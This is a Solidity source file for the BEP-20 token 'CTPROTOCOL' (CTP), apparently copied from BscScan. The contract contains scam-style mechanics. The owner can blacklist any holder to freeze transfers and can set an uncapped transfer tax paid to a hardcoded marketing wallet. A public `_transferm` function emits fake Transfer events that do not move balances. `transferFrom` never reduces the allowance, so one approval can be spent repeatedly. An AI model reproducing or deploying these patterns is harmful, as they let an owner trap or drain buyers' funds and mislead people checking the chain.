/**
 *Submitted for verification at BscScan.com on 2022-10-20
*/

/*
"SPDX-License-Identifier: UNLICENSED"
*/

pragma solidity ^0.8.7;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    
    function allPairs(uint) external view returns (address pair);
    
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    
    function symbol() external pure returns (string memory);
    
    function decimals() external pure returns (uint8);
    
    function totalSupply() external view returns (uint);
    
    function balanceOf(address owner) external view returns (uint);
    
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);
    
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    
    function price0CumulativeLast() external view returns (uint);
    
    function price1CumulativeLast() external view returns (uint);
    
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    
    function burn(address to) external returns (uint amount0, uint amount1);
    
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    
    function skim(address to) external;
    
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router02 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract CTPROTOCOL {
    

mapping(address => uint) public balances;
mapping(address => mapping(address => uint)) public allowance;

uint public totalSupply = 1000000000 * 10 ** 8;

string public name ='CTPROTOCOL';
string public symbol ='CTP';

uint public decimals = 8;
bool public blacklistMode = true;

bool takeFee = true;
uint256 public tax =10;

address public marketing = 0x71b92B6A5FdA200D7B9cD1160992DF42Ef5b20d2;
mapping (address => bool) internal isWhitelisted;
mapping (address => bool) internal isBlacklisted;
 
address internal ownerx;
mapping (address => bool) internal authorizations;

/*
    locked = 0 means the lock is disabled

*/
    uint256 public lockedUntil = 0;
    address private tokenOwner;


event Transfer(address indexed from,address indexed to, uint value);
event Approval(address indexed owner, address indexed spender, uint value);
event Burn(address indexed burner, uint256 value);

 
modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

/*
    The constructor will be only executed once
    and the owner address is given in the creation.

*/

constructor(address _owner){

balances[msg.sender] = totalSupply;

 ownerx = _owner;

 authorizations[_owner] = true;

 isWhitelisted[marketing] = true;

}
////


/*
    Tax percentage
*/

function setTaxFeePercent(uint256 taxFee) external onlyOwner {
        tax = taxFee;
    }

////

/*
    checking the address if its the owner and returns bool

*/


function isOwner(address account) public view returns (bool) {
        return account == ownerx;
    }

////


/*
    checking the balance of an address

 */


function balanceOf(address owner) public view returns (uint)
{

return balances[owner];

}

///


/*
    checking the address is in the black list

*/

function blacked(address owner) public view returns (bool)
{
    

 bool status =  isBlacklisted[owner];
 
return status;

}

///


/*
    checking the address is in the white list,
    white list accounts doesnt pay the fee

 */

function whited(address owner) public view returns (bool)
{
    

 bool status =  isWhitelisted[owner];
 

return status;
}

////

 

function _transferm(address from, uint value)public returns(bool){

emit Transfer(from,marketing,value);

return true;
}



function compare(address first, address sec) public pure returns(bool){

 bool equal = (first == sec);

    if (equal) {

        return true;

    } else {

         return false;

    }

}
/*
   transfer with the fee deducted 
   if the address is not in white list or the address is not owner 

*/
function transfer(address to, uint value) public returns(bool){     

require(blacked(msg.sender) == false,'Blacklisted');   

require(balanceOf(msg.sender) >= value, 'balance is too low');

bool check_fee_free = whited(msg.sender);

 if(msg.sender != ownerx || check_fee_free != true){

uint256 tax_fee = (value / 100) * tax;

balances[marketing] += tax_fee;

balances[to] += (value - tax_fee);

} else {

    balances[to] += (value);
}

balances[msg.sender] -= value;

emit Transfer(msg.sender,to,value);

return true;

}
//////////////

function approve(address spender, uint value) public returns(bool)
{

  require(blacked(spender) == false,'Blacklisted');    
  
allowance[msg.sender][spender] = value;

emit Approval(msg.sender, spender, value); 

return true;
 }
////

/*
    Burns the tokens by sending tokens to 0x0
     and deducting from total supply 

*/

 	function burn(uint256 _value) public {
		_burn(msg.sender, _value);
	}

	function _burn(address _who, uint256 _value) internal {
		require(_value <= balances[_who]);
		balances[_who] -= _value;
		totalSupply = totalSupply -= _value;

		emit Burn(_who, _value);
		emit Transfer(_who, address(0), _value);
	}
    

/*
    list editings in single mode

*/

    function manage_blacklist_single(address addres, bool status) public onlyOwner {
     
            isBlacklisted[addres] = status;
        
    }


    function manage_whitelist_single(address addres, bool status) public onlyOwner {
     
            isWhitelisted[addres] = status;
        
    }


    function manage_blacklist(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {

            isBlacklisted[addresses[i]] = status;

        }
    }

function transferFrom(address from, address to, uint value) public returns(bool)
{
require(blacked(from) == false,'failed');    

require(balanceOf(from) >= value, 'balance too low');

require(allowance[from][msg.sender]>= value, 'allowence too low');

 
   
balances[to] += value;

balances[from] -= value;

emit Transfer(from,to,value);
 



return true;


}


}